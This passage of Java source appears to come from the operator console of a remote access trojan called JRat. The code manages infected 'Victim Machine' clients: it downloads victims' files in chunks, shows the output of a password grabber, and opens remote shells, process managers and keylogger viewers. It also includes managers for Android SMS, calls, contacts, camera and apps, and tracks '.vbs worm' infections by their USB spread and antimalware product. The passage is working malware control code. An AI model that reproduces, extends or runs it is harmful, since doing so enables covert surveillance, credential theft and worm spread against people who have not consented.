										}catch(Exception y){ new MessageBox().errorBox_nothread(y.getMessage(), "Writer Error");}
										
										
										 
									 
										 
									}
								}
							 
						  }catch(Exception xa){
							  new MessageBox().errorBox_nothread(xa.getMessage(), "BIGGER TRY Error");
						  }
					  break;
				  case "Dw_Chunk": 
						 String platform = System.getProperty("os.name", "generic").toLowerCase(Locale.ENGLISH);
						 if ((platform.indexOf("mac") >= 0) || (platform.indexOf("darwin") >= 0)) {
							 
							 File_Seperator = ":";
						      } else if (platform.indexOf("win") >= 0) {
						    	  File_Seperator = "\\";
						    		 
						      } else if (platform.indexOf("nux") >= 0) {
						    	  File_Seperator = "/";
						    	 
						      } else {
						    	  File_Seperator = System.getProperty("path.separator");
						    	  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
						    		  File_Seperator = System.getProperty("file.separator");
						    		  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
						    			  File_Seperator = "/";
						    		  }
						    	  }
						      }
					  String chunk_local_path = SplitString(Data).get(4);
						String chunk_filename = SplitString(Data).get(2);//with dot 
					   String content = SplitString(Data).get(6);
					   String currentUsersHomeDirx = System.getProperty("user.home");
					   String chu_fol_path = currentUsersHomeDirx + File_Seperator + "JRat_Downloads" +File_Seperator + SplitString(Data).get(3)+"_Down";
					   
					   File fx = new File(chu_fol_path); 
					 
					   if(fx.exists() == false){
							fx.mkdirs();
						
						} 
					   File x = new File(chu_fol_path);
					   File Chunk_file = new File(x.getAbsolutePath() + File_Seperator + chunk_filename);
					 
					  //System.out.println("i put " + y.getAbsolutePath());
					  try {
						 
						SAVE_TO_DISK(Chunk_file.getAbsolutePath(),content);
					     //Send_Data("send_single"+YY,sock);
							   
						  Send_Data("send_chunk"  + YY + chunk_local_path +YY + SplitString(Data).get(3) + YY + SplitString(Data).get(5)  + YY, sock,false);
					} catch (Exception e1) {
						System.out.println(Data);
						  System.out.println("ex\n" + e1.getMessage());
					}
					  for (Downloader opn : Open_Downloaders){
						  //new MessageBox().infoBox(opn.Get_fname(), SplitString(Data).get(3));  && opn.Get_fname().equals(SplitString(Data).get(3))
							if(opn.Get_sock().equals(sock) ){
								opn.Perform_data();
								opn.set_chunk_counter(Integer.parseInt(SplitString(Data).get(5)));
								try {
									opn.SetDownloader_W(sock,"Downloading...");
								} catch (InterruptedException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}
							 break;
							}
						}
					  break;
				  case "finished_chunk":
					  try{
						 System.out.print("i got finished"+ Data);
						
							 String platformx = System.getProperty("os.name", "generic").toLowerCase(Locale.ENGLISH);
							 if ((platformx.indexOf("mac") >= 0) || (platformx.indexOf("darwin") >= 0)) {
								 
								 File_Seperator = ":";
							      } else if (platformx.indexOf("win") >= 0) {
							    	  File_Seperator = "\\";
							    		 
							      } else if (platformx.indexOf("nux") >= 0) {
							    	  File_Seperator = "/";
							    	 
							      } else {
							    	  File_Seperator = System.getProperty("path.separator");
							    	  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
							    		  File_Seperator = System.getProperty("file.separator");
							    		  if(File_Seperator !="/" || File_Seperator !="\\" || File_Seperator !=":"){
							    			  File_Seperator = "/";
							    		  }
							    	  }
							      }
						  String finsihed_chunk_name = SplitString(Data).get(2);
						  String usr_dir = System.getProperty("user.home");
						  int lasx = finsihed_chunk_name.lastIndexOf(".part");
						  finsihed_chunk_name = finsihed_chunk_name.substring(0,lasx);
						  String finished_chunks = usr_dir + File_Seperator + "JRat_Downloads" + File_Seperator+ finsihed_chunk_name+"_Down"; 
					 
						  Join_Chunks(finished_chunks , finsihed_chunk_name);
						   for (Downloader opn : Open_Downloaders){
							   //new MessageBox().infoBox(opn.Get_fname(), SplitString(Data).get(2).replace(".part0", ""));
							   //&& opn.Get_fname().equals(finsihed_chunk_name.replace(".part0", ""))
								if(opn.Get_sock().equals(sock) ){
								
									//System.out.println(finished_chunks);
									 String filedir_exec = usr_dir + File_Seperator +"JRat_Downloads" + File_Seperator;	
									
									 if (new File(filedir_exec).exists() ==false){
										 new File(filedir_exec).mkdirs();
									 }
										FileInputStream fis=new FileInputStream(new File(finished_chunks+File_Seperator+finsihed_chunk_name));
										FileOutputStream fos=new FileOutputStream(new File(filedir_exec+File_Seperator+finsihed_chunk_name));
										int bfsz;
										byte[] buff = new byte[512];
										while((bfsz=fis.read(buff))>0){
											fos.write(buff, 0, bfsz);
										}
										fis.close();
										fos.close();
										 opn.On_Finish(filedir_exec,finsihed_chunk_name);
										 //String CH_path = SplitString(Data).get(3).replace( SplitString(Data).get(2), "");
										
									 Desktop.getDesktop().open(new File(filedir_exec));
									 for (File_Manager_VB opnx : Open_FM_VB){
											if(opnx.Get_sock().equals(sock)){
												opnx.re_enable();
												 break;
											}
										}
									 File dir = new File(finished_chunks + File_Seperator);
									 File[] currList;
									 Stack<File> stack = new Stack<File>();
									 stack.push(dir);
									 while (! stack.isEmpty()) {
									     if (stack.lastElement().isDirectory()) {
									         currList = stack.lastElement().listFiles();
									         if (currList.length > 0) {
									             for (File curr: currList) {
									                 stack.push(curr);
									             }
									         } else {
									             stack.pop().delete();
									         }
									     } else {
									         stack.pop().delete();
									     }
									 }
									 Send_Data("reset_chunk_downloaders"+ YY + SplitString(Data).get(3) + YY, sock,false);
									// Desktop.getDesktop().open(new File(finished_chunks));
									/*Send_Data("DELETE_Chunks" + YY  + SplitString(Data).get(3),sock);
									File cdf = new File(finished_chunks);
									 if (cdf.exists()){
										  File [] filesx = cdf.listFiles();
										  for(File xd : filesx){
											  if(xd.getName().contains(".part")){
												  try{xd.delete();}catch(Exception xexp){}
											  }
											  }
									  }*/
									 break;
								}
							 
							}
						 
					  }catch(Exception xa){
				 
					  }
					
					  
				  break;
				  case "grabber_notx":
					  JOptionPane.showMessageDialog(null, "Passowrd grabber is not activated / installed on Vicitm Machine" + "\n" + 
				  "Install pass grabber to install / run on Victim Machine", "Password grabber Error"  + "\n" + "Report From : " + sock, JOptionPane.ERROR_MESSAGE);
					  break;
				  case "pass_grabbing_done":
					  JOptionPane.showMessageDialog(null, "Passowrd grabber is activated on Vicitm Machine [passwords are ready]" + "\n" + 
							  "Executed pass grabber on Victim Machine", "Password grabber Executed"  + "\n" + "Report From : " + sock, JOptionPane.INFORMATION_MESSAGE);
					  break;
				  case "get_passwords_data":
					  /*JOptionPane.showMessageDialog(null, "Passowrd grabber is activated on Vicitm Machine [passwords are ready]" + "\n" + 
							  SplitString(Data).get(2), "Password grabber Executed"  + "\n" + "Report From : " + sock, JOptionPane.PLAIN_MESSAGE);*/
					   
					  if (Open_Forms.contains("pass_grabber" + sock) ==false ){
						  
							try {
								Password_Viewer instance_passview = null;
						 
								  for (Password_Viewer opn : Open_Password_Viewer){
										if(opn.Get_sock().equals(sock)){
											 
												instance_passview = opn;
											    break;
											 
										}
								  }
								  if(instance_passview==null){
									  System.out.println("here" + Data);
									  instance_passview = new Password_Viewer(sock);
										 if (Open_Password_Viewer.contains(instance_passview)==false){
								 
											  instance_passview.Do_frame();
											  instance_passview.command();
											  instance_passview.Perform_data(Data);
											  Open_Password_Viewer .add(instance_passview);
											    break;
										  } 
										
										   
								  }else{
										 if (Open_Password_Viewer.contains(instance_passview)==false){
										 
											  instance_passview.Do_frame();
											  instance_passview.command();
											  instance_passview.Perform_data(Data);
											  Open_Password_Viewer .add(instance_passview);
											    break;
										  } else{
											Remove_Form_FileManager_VB(sock);
											instance_passview= new Password_Viewer(sock);
								 
											  instance_passview.Do_frame();
											  instance_passview.command();
											  instance_passview.Perform_data(Data);
											  Open_Password_Viewer .add(instance_passview);
											    break;
											  
										  }
								  }
								
							} catch (Exception e) {
 
							}
						  
						  
						  
						  
						
						
						  Open_Forms.add("pass_grabber" + sock);
						  
					}
					  break;
				 
				  case "open_proc": 
					  
					  
					  if (Open_Forms.contains("open_proc" + sock) ==false ){
						  
							try {
								Process_Manager instance_fm = null;
						 
								  for (Process_Manager opn : Open_Proc_VB){
										if(opn.Get_sock().equals(sock)){
											 
												instance_fm = opn;
											    break;
											 
										}
								  }
								  if(instance_fm==null){
									  System.out.println("here" + Data);
									  instance_fm = new Process_Manager(sock);
										 if (Open_Proc_VB.contains(instance_fm)==false){
								 
											  instance_fm.Do_frame();
											  instance_fm.command();
											  Open_Proc_VB .add(instance_fm);
											    break;
										  } 
										
										   
								  }else{
										 if (Open_Proc_VB.contains(instance_fm)==false){
										 
											  instance_fm.Do_frame();
											  instance_fm.command();
											  Open_Proc_VB .add(instance_fm);
											    break;
										  } else{
											Remove_Form_FileManager_VB(sock);
											instance_fm= new Process_Manager(sock);
								 
											  instance_fm.Do_frame();
											  instance_fm.command();
											  Open_Proc_VB .add(instance_fm);
											    break;
											  
										  }
								  }
								
							} catch (Exception e) {
 
							}
						  
						  
						  
						  
						
						
						  Open_Forms.add("open_proc" + sock);
						  
					}
					  break;
				 
				  
				  
				  case "chunk_exp":
					  for (Downloader opn : Open_Downloaders){
							if(opn.Get_sock().equals(sock)){
								//Program Owner : SaherBlueEagle

								//opn.set_chunk_counter(Integer.parseInt(SplitString(Data).get(2)));
								try {
									opn.SetDownloader_W(sock,"Exception Error , Cannot Download This file");
								} catch (InterruptedException e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}
								 break;
							}
						}
					  
					  break;
					  
				  case "kill_uns_up":
				 
						 // if (Open_Forms.contains("open_fm" + sock) ==true ){
							for (File_Manager_VB opn : Open_FM_VB){
								if(opn.Get_sock().equals(sock)){
									opn.Perform_data(Data);
								 
								}
							}
							   
						 // }
						  break;  
				 case "actual_chunk_uupload":
				 
					 
						 // if (Open_Forms.contains("open_fm" + sock) ==true ){
							for (File_Manager_VB opn : Open_FM_VB){
								if(opn.Get_sock().equals(sock)){
									opn.Perform_data(Data);
								 
								}
							}
							   
						 // }
						  break;  
				 case "no_actual_uupload":
					 
					 
					 // if (Open_Forms.contains("open_fm" + sock) ==true ){
						for (File_Manager_VB opn : Open_FM_VB){
							if(opn.Get_sock().equals(sock)){
								opn.Perform_data(Data);
							 
							}
						}
						   
					 // }aaaa
					  break;
				 case "finished_upload_uns":
					 
					 
					 // if (Open_Forms.contains("open_fm" + sock) ==true ){
						for (File_Manager_VB opn : Open_FM_VB){
							if(opn.Get_sock().equals(sock)){
								opn.Perform_data(Data);
							 
							}
						}
						   
					 // }
					  break;
				case "send_chunk_uupload":
				 
					 
						 // if (Open_Forms.contains("open_fm" + sock) ==true ){
							for (File_Manager_VB opn : Open_FM_VB){
								if(opn.Get_sock().equals(sock)){
									opn.Perform_data(Data);
								 
								}
							}
							 try{
								 int icpoux = 0;
							  for (Uploader opn : Open_Uploaders_uns){
									if(opn.Get_sock().equals(sock) ){
										String numeric = SplitString(Data).get(3);
										numeric = numeric.replace("fsfs", "");
									//	 System.out.print("\nMaster : " +numeric+"\n");
										 int chunkSize = 0  ;
										 File file = new File(SplitString(Data).get(2));
										  File f=new File(file.getAbsolutePath());
									  		long len = file.length();
									  		int b = 1024;//10024 * 1  ;
									  	 
									  		 
											try {
												int c=(int)len/b;
											  	
										  		if(((int)len%b)!=0){
										  			c++;
										  		}
										  		chunkSize = c;
												 
										  		
											} catch (Exception e) {
												 Master.Send_Data("chunk_exp_upload" + YY + e.getMessage() + YY ,sock,false);
											} 
									 
											opn.set_chunk_counter(chunkSize,Integer.parseInt(numeric));
											//opn.Perform_data();
												icpoux +=1;
											try {
												opn.SetDownloader_W(sock,"UnI File Uploader / Status : Uploading...");
											
											} catch (InterruptedException e) {
											 
											}
											 
										}
									}
								 if(icpoux ==0){
									  
										try {
											  Uploader instance_fm = new Uploader(sock,"Preparing Uploader Please Wait..",SplitString(Data).get(2),"");
											if (Open_Uploaders_uns.contains(instance_fm)==false){
												Open_Uploaders_uns.add(instance_fm);
												 instance_fm.Do_frame();
												
												 instance_fm.set_chunk_counter(Integer.parseInt((SplitString(Data).get(7))),Integer.parseInt((SplitString(Data).get(5))));
												 instance_fm.SetDownloader_W(sock,"Download Type : Unstable download / Status : Downloading...");
												 Open_Forms.add("downloader_chunk_uns" + sock);
												} 
											
										} catch (Exception e) {
											// TODO Auto-generated catch block
											e.printStackTrace();
										}
										
								 }else{
									 break;
								 }
								 }catch(Exception e){}  
						 // }
						  break; 	 
				
				  }//end switch
				 
			}
		}
		}
		
	}
	
	
	
	
	private static int Get_Progress_downloader(String saver_dir){
	 	int parts_count = 0;
	 	saver_dir = saver_dir  + "Progress_Uploader_Chunk.txt";
	 	try{
	 		File xf = new File(saver_dir);
	 		if (xf.exists()){
	 			BufferedReader br = new BufferedReader(new FileReader(xf));
	 	 		parts_count = Integer.parseInt(br.readLine());
	 		}else{
	 			
	 			xf.createNewFile();
	 			FileWriter FW = new  FileWriter(xf);
	 			FW.write(""+parts_count);
	 			FW.close();
	 			BufferedReader br = new BufferedReader(new FileReader(xf));
	 	 		parts_count = Integer.parseInt(br.readLine());
	 		}
	 		
	 	}catch(Exception x){
	 		File xf = new File(saver_dir);
	 		if (xf.exists()){
	 			xf.delete();
	 			try {
					xf.createNewFile();
					FileWriter FW = new  FileWriter(xf);
		 			FW.write(""+parts_count);
		 			FW.close();
		 			BufferedReader br = new BufferedReader(new FileReader(xf));
		 	 		parts_count = Integer.parseInt(br.readLine());
	 				} catch (IOException e) {}
	 		
	 		}else{
	 			try {
					xf.createNewFile();
					FileWriter FW = new  FileWriter(xf);
		 			FW.write(""+parts_count);
		 			FW.close();
		 			BufferedReader br = new BufferedReader(new FileReader(xf));
		 	 		parts_count = Integer.parseInt(br.readLine());
	 				} catch (IOException e) {}
	 		}
	 	}
	 	return parts_count;
	 	
	 }
	private static  Thread x_check;
	private static void Check_For_version_update() { 
		 
	 }
	private static void Check_For_version_update(String rec_url) throws Exception{ 
	  
 
		  
	}
	private static boolean check_ifsock_local(String sock_selected) throws Exception{
		return true;
	}
	private static void Update_global() throws Exception{
 
    		
	}
	 private static void save_Progress_downloader(String prog_saver,int parts_count){
		 prog_saver = prog_saver  + "Progress_Uploader_Chunk.txt";
		 try {
			    File xf = new File(prog_saver);
				if (xf.exists()== false){
					xf.createNewFile();
					FileWriter FW = new  FileWriter(xf);
					FW.write(""+parts_count);
					FW.close();
					BufferedReader br = new BufferedReader(new FileReader(xf));
			 		parts_count = Integer.parseInt(br.readLine());
				}else{
					FileWriter FW = new  FileWriter(xf);
					FW.write(""+parts_count);
					FW.close();
					BufferedReader br = new BufferedReader(new FileReader(xf));
			 		parts_count = Integer.parseInt(br.readLine());
				}
				
				} catch (IOException e) {}
	 }
		
	
	private static int called= 0;
	 private static byte[] Certain_Bytes(FileInputStream fis,int Chunk_to_Read_From,int size,File file) throws IOException{
		 
			int i;
			 
			fis.skip((Chunk_to_Read_From)*size);
			
			ByteArrayOutputStream bOutput = new ByteArrayOutputStream(size+1);
			  for(int j=0;j<size;j++){
		 		 	int    bytesRead;
					if((bytesRead=fis.read())!=-1){
						 bOutput.write(bytesRead);
						}
				 
					}
			  if(called==1){//because it repeats last Chunk twice , thus we will take only one 
				  return null;
			  }
			  System.out.println("size " + bOutput.size() + " called : " + called);
			bOutput.close();
			if ( bOutput.size()< size){
				called +=1;
			}
			return bOutput.toByteArray();
		}
	
	
	 private static void Join_Chunks(String oath,String filenamefinal ){
	    	File ofile = new File(oath);
	    	FileOutputStream fos;
	    	FileInputStream fis;
	    	 new MessageBox().infoBox(oath, filenamefinal);
	    	 File [] files = ofile.listFiles();
	    	try {
	    	    fos = new FileOutputStream(oath+File_Seperator+filenamefinal );    
	    	    int parts_counter = 0;
	    	   
	    	    while (parts_counter < files.length) {
	    	        int ch;
	    	        fis = new FileInputStream(new File(oath+File_Seperator+filenamefinal+".part"+parts_counter));
	    	        while((ch=fis.read())!=-1)
					{
					fos.write(ch); 
					 
						}
	    	      fis.close();
	    	        parts_counter +=1;
	    	    }
	    	    fos.close();
	    	    fos = null;
	    	    fis = null;
	    	    
	    }catch(Exception x11){  }
	    	
	    	}
	 private static void writeByteArraysToFile(String fileName, byte[] content) throws IOException {
		  
	     File file = new File(fileName);
	     BufferedOutputStream writer = new BufferedOutputStream(new FileOutputStream(file));
	     writer.write(content);
	    writer.flush();
	    writer.close();
		 // new MessageBox().infoBox("File : " + file.getName()+  " Downloaded Successfully" + "\n" + "Path : " + file.getPath(), "");
	 
	 }
	 private static void SAVE_TO_DISK(String fname , String s1 ) throws IOException{
		 byte[] arr = Base64.getDecoder().decode(s1);
		 writeByteArraysToFile(fname,arr);
	 }
	 private static  ArrayList<String> SplitString_D(String s,String Delimeter){
		 String Word = "";
		 
		 String YY = Delimeter;
	 ArrayList<String>Words = new ArrayList<String>();
	 if(s.contains(YY)==false){
		 Words.add(s);
		 
		
		 return Words;
			
	 }else{

		 for (int i = 0 ; i<s.length();i++){
			 if ((s.charAt(i) =='|')== false) {
				 Word += s.charAt(i);
			 }else{
				 if(Words.contains(Word)==false){
				 Words.add(Word);
				 
				}
				 Word = "";
			 }
		 }
			 
			 return Words;
			 
	 }
		   
	 }
	 public static void Remove_Form_FileManager_Android(String form_sock){
			for(String sc : Open_Forms){
				if (sc.contains(form_sock)){
					Open_Forms.remove(sc);
					for (Android_File_Manager opn : Open_FM_Android){
						if(opn.Get_sock().equals(form_sock)){
							Open_FM_Android.remove(opn);
								break;
						}
					}
					
					break;
				}
			}
		}
		public static void Remove_Form_SMSManager_Android(String form_sock){
			for(String sc : Open_Forms){
				if (sc.contains(form_sock)){
					Open_Forms.remove(sc);
					for (Android_SMS_Manager opn : Open_SMS_Android){
						if(opn.Get_sock().equals(form_sock)){
							Open_SMS_Android.remove(opn);
							break;
						}
					}
					
					break;
				}
			}
		}
		public static void Remove_Form_CallsManager_Android(String form_sock){
			for(String sc : Open_Forms){
				if (sc.contains(form_sock)){
					Open_Forms.remove(sc);
					for (Android_Calls_Manager opn : Open_Calls_Android){
						if(opn.Get_sock().equals(form_sock)){
							Open_Calls_Android.remove(opn);
								break;
						}
					}
					
					break;
				}
			}
		}
		public static void Remove_Form_ContactsManager_Android(String form_sock){
			for(String sc : Open_Forms){
				if (sc.contains(form_sock)){
					Open_Forms.remove(sc);
					for (Android_Contacts_Manager opn : Open_Contacts_Android){
						if(opn.Get_sock().equals(form_sock)){
							Open_Contacts_Android.remove(opn);
								break;
						}
					}
					
					break;
				}
			}
		}
		public static void Remove_Form_ChatManager_Android(String form_sock){
			for(String sc : Open_Forms){
				if (sc.contains(form_sock)){
					Open_Forms.remove(sc);
					for (Android_Chat_Manager opn : Open_Chat_Android){
						if(opn.Get_sock().equals(form_sock)){
							Open_Chat_Android.remove(opn);
								break;
						}
					}
					
					break;
				}
			}
		}
		public static void Remove_Form_CamManager_Android(String form_sock){
			for(String sc : Open_Forms){
				if (sc.contains(form_sock)){
					Open_Forms.remove(sc);
					for (Android_Cam_Manager opn : Open_Cam_Android){
						if(opn.Get_sock().equals(form_sock)){
							Open_Cam_Android.remove(opn);
								break;
						}
					}
					
					break;
				}
			}
		}
		public static void Remove_Form_AppsManager_Android(String form_sock){
			for(String sc : Open_Forms){
				if (sc.contains(form_sock)){
					Open_Forms.remove(sc);
					for (Android_Apps_Manager opn : Open_Apps_Android){
						if(opn.Get_sock().equals(form_sock)){
							Open_Apps_Android.remove(opn);
								break;
						}
					}
					
					break;
				}
			}
		}
	 
	 public static void Remove_Form_Shells(String form_sock){
		for(String sc : Open_Forms){
			if (sc.contains(form_sock)){
				Open_Forms.remove(sc);
				for (terminal_command opn : Open_Shells){
					if(opn.Get_sock().equals(form_sock)){
						Open_Shells.remove(opn);
							break;
					}
				}
				
				break;
			}
		}
	}public static void Remove_Form_Loggers(String form_sock){
		for(String sc : Open_Forms){
			if (sc.contains(form_sock)){
				Open_Forms.remove(sc);
				for (keylogger_viewer opn : Open_Loggers){
					if(opn.Get_sock().equals(form_sock)){
						Open_Loggers.remove(opn);
							break;
					}
				}
				
				break;
			}
		}
	}
	public static void Remove_Form_FileManager_VB(String form_sock){
		for(String sc : Open_Forms){
			if (sc.contains(form_sock)){
				Open_Forms.remove(sc);
				for (File_Manager_VB opn : Open_FM_VB){
					if(opn.Get_sock().equals(form_sock)){
						 Open_FM_VB.remove(opn);
							break;
					}
				}
				
				break;
			}
		}
	}	public static void Remove_Form_Open_Password_Viewer(String form_sock){
		for(String sc : Open_Forms){
			if (sc.contains(form_sock)){
				Open_Forms.remove(sc);
				for (Password_Viewer opn : Open_Password_Viewer){
					if(opn.Get_sock().equals(form_sock)){
						Open_Password_Viewer.remove(opn);
							break;
					}
				}
				
				break;
			}
		}
	}public static void Remove_Form_Open_Proc(String form_sock){
		for(String sc : Open_Forms){
			if (sc.contains(form_sock)){
				Open_Forms.remove(sc);
				for (Process_Manager opn : Open_Proc_VB){
					if(opn.Get_sock().equals(form_sock)){
						Open_Proc_VB.remove(opn);
							break;
					}
				}
				
				break;
			}
		}
	}
	public static void Remove_Form_Notif(String form_sock){
		for(String sc : Open_Forms){
			if (sc.contains(form_sock)){
				Open_Forms.remove(sc);
				for (Notif opn : Open_Notif){
					if(opn.Get_sock().equals(form_sock)){
						Open_Notif.remove(opn);
						break;
					}
				}
				
				break;
			}
		}
	}public static void Remove_Form_Open_Downloaders(String form_sock,String fname){
		for(String sc : Open_Forms){
			if (sc.contains(form_sock)){
				Open_Forms.remove(sc);
				for (Downloader opn : Open_Downloaders){
					if(opn.Get_sock().equals(form_sock)){
						Open_Downloaders.remove(opn);
						
						}
				}
				
				break;
			}
		}
	}public static void Remove_Form_Open_Downloaders_uns(String form_sock,String fname){
		for(String sc : Open_Forms){
			if (sc.contains(form_sock)){
				Open_Forms.remove(sc);
				for (Downloader_uns opn : Open_Downloaders_uns){
					if(opn.Get_sock().equals(form_sock)){
						Open_Downloaders_uns.remove(opn);
					 break;
						}
				}
				
			 break;
			}
		}
	}public static void Remove_Form_Open_Uploaders_uns(String form_sock,String fname){
		for(String sc : Open_Forms){
			if (sc.contains(form_sock)){
				Open_Forms.remove(sc);
				for (Uploader opn : Open_Uploaders_uns){
					if(opn.Get_sock().equals(form_sock)){
						Open_Uploaders_uns.remove(opn);
					 break;
						}
				}
				
			 break;
			}
		}
	}
	public static void Remove_Form_Desktop_VB(String form_sock){
		for(String sc : Open_Forms){
			if (sc.contains(form_sock)){
				Open_Forms.remove(sc);
				for (Desktop_VB opn : Open_Desktops_VB){
					if(opn.Get_sock().equals(form_sock)){
						Open_Desktops_VB.remove(opn);
						break;
					}
				}
				
				break;
			}
		}
	}
	public static void Raise_Data_vbs(String Data,String sock){
		System.out.println("VBS Data : " + Data + " Raised From " + sock);
		 String YY = "";
		 String xx = "|||";
		 YY = xx.charAt(0)+ "" +xx.charAt(1);
		if (Data.isEmpty()==false){
			if (Data.contains("POST /")){
				if (Data.contains("qiQqi") || Data.contains("POST /")){
					Data = Data.replace("POST /", "");
					Data = Data.replace("HTTP/1.1", "");
					Data = Data.replace("%7C", ("\\").charAt(0)+"" + YY);
					Data = Data.replace("qiQqi", YY);
					
					if(Data.contains(YY)){
						for (int i = 0 ; i < SplitString_D(Data,"drv_split").size();i++){
							String item = SplitString_D(Data,"drv_split").get(i);
							
							item = item.replace("drv_split", "");
							System.out.println("Data L : " 
									+ item);
						}
						 
						switch(SplitString(Data).get(0)){
						
						}
					}else{
						switch (Data){
						case "open_fm ":
							
							break;
						}
					}
					
					//System.out.println("VBS xx : " + SplitString(Data).get(0) + " Raised From " + sock);
				 
				}

			//	Add_Victim(Data,sock);
				
				//Send_Data("Why ya homar ???",sock);
			}else if (Data.contains("User-Agent")){
				if (Data.contains("qiQqi")){
					Data = Data.replace("User-Agent", YY);
					Data = Data.replace(": ", YY);
					Data = Data.replace("qiQqi", YY);
					//System.out.println("VBS Datax : " + Data + " Raised From " + sock);
					//System.out.println("VBS xx : " + SplitString(Data).get(0) + " Raised From " + sock);
					String worm_id = SplitString(Data).get(1);
					String user_id = SplitString(Data).get(2) + " / " +  SplitString(Data).get(3);
					String OS_id = SplitString(Data).get(4);
					String ver_id = SplitString(Data).get(5);  
					String other_d = SplitString(Data).get(6) ;  
					 yourAddRow("null",worm_id,
							 sock,OS_id,
							 "N / A " + " USB Spread : " + SplitString(Data).get(7)   
							 ,"PC / USER : " + user_id,
							  " .vbs worm on Windows PC" + " Antimalware : " +  other_d,"Unknown");

					 j.repaint();
					 //sp = new JScrollPane(j); 
				     //sp.setBounds(5, 50, 990, 300); 
				     sp.updateUI();
					 form.repaint();
				}

			//	Add_Victim(Data,sock);
				
				//Send_Data("Why ya homar ???",sock);
			}
		
		}
		
	}
	public static byte[] toByteArray(InputStream in) throws IOException {

		ByteArrayOutputStream os = new ByteArrayOutputStream();

		byte[] buffer = new byte[1024];
		int len;

		 
		while ((len = in.read(buffer)) != -1) {
			 
			os.write(buffer, 0, len);
		}

		return os.toByteArray();
	}
	public static void Send_Data(String Data,String sock,boolean is_ander){
		try {
			 
	    	String Exe_Split = "fxf0x4x4x0fxf";
	    	String Exe_Ending = "c2x2824x828200x0c";
	    	String Jar_Split = "fxf0x4x4x0fxf";
	    	String Jar_Ending = "c2x2824x828200x0c";
	    	if(is_ander){
	    		Server_X_Client.Send_To_android(Data, sock);
	    	}else{
	    		Server_X_Client.Send_To_client(Data, sock);
	    	}
			
		
		} catch (IOException e) {
			System.out.println("Failed to Send to : "  + sock);
		}
	}
	public static void yourAddRow(final String str0,final String str1, final String str2, final String str3 , final String str4 , final String str5, final String str6,final String str7){
		  DefaultTableModel Model = (DefaultTableModel) j.getModel();
			 for(int row = 0;row < Model.getRowCount();row++) {
					
			 	    for(int col = 0;col < Model.getColumnCount();col++) {
			 	    	if (Model.getValueAt(row, 2) == str2 || (Model.getValueAt(row, 2)).toString().contains(str2)){
			 	    	
			 	    		return;
			 	    	}
			 	        
			 
			 	    }
			 
			 	}//
			 ImageIcon icon_country = null;
			 try{
			 icon_country= new ImageIcon(Master.class.getResource("/pkg_flags/" + str7.toLowerCase() + ".png"));
				System.out.println("\nxadd" + "/pkg_flags/" + str7.toLowerCase() + ".png");
			 }catch(Exception x){
				 icon_country= new ImageIcon(Master.class.getResource("/pkg_flags/" +"user_1.png"));

			 }
						   JLabel str4_la = new JLabel();
			  // str4_la.setLayout(null);
			   str4_la.setBounds(0,0,50,20);
			   str4_la.setIcon(icon_country);
			  if (str3.contains("Win") && str3.contains("8") || str3.contains("Win") && str3.contains("8.1") || str3.contains("Win") && str3.contains("10")){
				  ImageIcon icon=new ImageIcon(Master.class.getResource("Windows10.png"));
				  Model.addRow(new Object[]{icon,str1, str2, str3,icon_country,str4,str5,str6});
			  }else   if (str3.contains("Win") && str3.contains("7") || str3.contains("Win") || str3.contains("seven") || str3.contains("Win") && str3.contains("Seven") || str3.contains("Win") && str3.contains("even") || str3.contains("Win") && str3.contains("2008")|| str3.contains("Win") && str3.contains("2007")  ){
				  ImageIcon icon=new ImageIcon(Master.class.getResource("Windows7.png"));
				  Model.addRow(new Object[]{icon,str1, str2, str3,icon_country,str4,str5,str6});
			  }else   if (str3.contains("Win") && str3.contains("xp") || str3.contains("Win") || str3.contains("XP")|| str3.contains("Win") && str3.contains("2003")|| str3.contains("Win") && str3.contains("Server")  || str3.contains("Win") && str3.contains("erver")|| str3.contains("Win") && str3.contains("2001") || str3.contains("Win") && str3.contains("2002")  ){
				  ImageIcon icon=new ImageIcon(Master.class.getResource("WindowsXP.png"));
				  Model.addRow(new Object[]{icon,str1, str2, str3,icon_country,str4,str5,str6});
			  }else   if (str3.contains("Win") && str3.contains("vista") || str3.contains("Win") || str3.contains("Vista")|| str3.contains("Win") && str3.contains("ista")|| str3.contains("Win") && str3.contains("esta")  || str3.contains("Win") && str3.contains("2008")|| str3.contains("Win") && str3.contains("2001") || str3.contains("Win") && str3.contains("2002")  ){
				  ImageIcon icon=new ImageIcon(Master.class.getResource("Windows Vista.png"));
				  Model.addRow(new Object[]{icon,str1, str2, str3,icon_country,str4,str5,str6});
			  }else   if (str3.contains("lin") || str3.contains("Linu") || str3.contains("linu") || str3.contains("linux")){
				  ImageIcon icon=new ImageIcon(Master.class.getResource("Linux.png"));
				  Model.addRow(new Object[]{icon,str1, str2, str3,icon_country,str4,str5,str6});
			  }else   if (str3.contains("mac") || str3.contains("darwin") || str3.contains("Mac") || str3.contains("MAC")){
				  ImageIcon icon=new ImageIcon(Master.class.getResource("Mac.png"));
				  Model.addRow(new Object[]{icon,str1, str2, str3,icon_country,str4,str5,str6});
			  }else   if (str3.contains("sunos") || str3.contains("suno") || str3.contains("solaris") || str3.contains("solari")){
				  ImageIcon icon=new ImageIcon(Master.class.getResource("Linux.png"));
				  Model.addRow(new Object[]{icon,str1, str2, str3,icon_country,str4,str5,str6});
			  }else   if (str3.contains("Android") || str3.contains("ndroid") || str3.contains("Androi") || str3.equals("Android")){
				  ImageIcon icon=new ImageIcon(Master.class.getResource("android.png"));
				  
				  Model.addRow(new Object[]{icon,str1, str2, str3,icon_country,str7,str6,str5});
			  }
			  else {
				  ImageIcon icon=new ImageIcon(Master.class.getResource("unknowen.png"));
				  Model.addRow(new Object[]{icon,str1, str2, str3,str4_la.getText(),str5,str6});
			
			  }
		  //in trojan to get countery 
				//public static String getCountry() {
					//Locale tLocate = Locale.getDefault();
					//return System.getProperty("user.country") + "#"
						//	+ tLocate.getDisplayCountry(Locale.ENGLISH);
				//}

		 //IP is 2nd column
		  for(int row = 0;row < Model.getRowCount();row++) {
			  for(int col = 0;col < Model.getColumnCount();col++) {
				  j.setRowHeight(row, 50);
				   
		 	      }
		 	}
			 TableColumnModel columnModel = j.getColumnModel();
			 columnModel.getColumn(0).setMaxWidth(50);
			 columnModel.getColumn(1).setMaxWidth(120);
			 columnModel.getColumn(4).setMaxWidth(25);
			 //Notification
			 if (Open_Forms.contains("notif" + str2) ==false ){
